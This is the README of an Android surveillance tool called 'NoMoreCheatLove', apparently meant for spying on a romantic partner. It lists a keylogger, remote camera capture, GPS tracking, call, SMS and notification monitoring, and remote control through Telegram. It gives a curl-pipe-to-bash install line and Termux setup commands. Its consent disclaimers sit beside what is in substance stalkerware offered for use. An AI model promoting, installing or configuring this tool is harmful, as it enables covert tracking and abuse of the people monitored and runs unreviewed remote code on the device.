# NoMoreCheatLove 🔍  
### Advanced Anti-Cheat Monitoring System for Android  

⚠️ **Legal Warning**: This tool must only be used with **explicit written consent**. Unauthorized monitoring violates privacy laws (GDPR, CFAA, etc).  

---

## 🌟 Features  
| Feature          | Description                          |
|------------------|--------------------------------------|
| 📍 Live Location | Real-time GPS tracking               |
| 📸 Remote Camera | Front/Rear camera capture           |
| 📞 Call/SMS Logs | Monitor calls & messages            |
| 🔔 Notifications | Read all device notifications       |
| 🗝️ Keylogger    | Track keyboard input                |
| 🤖 Telegram Bot  | Remote control via Telegram         |

---

## 🚀 Installation  
### Single-Line Install (Termux)  
```bash
curl -sL https://raw.githubusercontent.com/likhonsheikhofficial/NoMoreCheatLove/main/install.sh | bash
```

### Manual Setup  
1. Install Termux from F-Droid  
2. Run:  
```bash
pkg update && pkg install git -y
git clone https://github.com/likhonsheikhofficial/NoMoreCheatLove
cd NoMoreCheatLove
chmod +x install.sh
./install.sh
```

---

## 🔧 Configuration  
During installation, provide:  
1. Your **Telegram Bot Token** (@BotFather)  
2. Your **Telegram Chat ID** (@userinfobot)  

---

## 📜 Legal Disclaimer  
```legal
THE SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY. DEVELOPER ASSUMES NO LIABILITY 
FOR UNAUTHORIZED USE. USER MUST COMPLY WITH ALL LOCAL LAWS. 

Required Consent Documentation Must Include:
1. Monitored individual's signature
2. Date range of monitoring
3. Specific data being collected
```

---

## 🛡️ Security Measures  
- End-to-end encrypted communications  
- Automatic session timeout (24h)  
- Two-factor admin authentication  
- No data storage on external servers  

---

## ❓ FAQ  
**Q:** How to uninstall?  
```bash 
pkg uninstall termux-api python -y
rm -rf ~/.nmcl_env ~/.termux/boot/nmcl_start
```

**Q:** Bot not responding?  
```bash
killall python && cd ~/.nmcl && python nmcl_bot.py
```

---

## 📌 Ethical Use Guidelines  
1. Always obtain **written consent**  
2. Display monitoring notification on target device  
3. Provide opt-out mechanism  
4. Regularly delete collected data  

[![License](https://img.shields.io/badge/License-CC%20BY--NC--ND%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
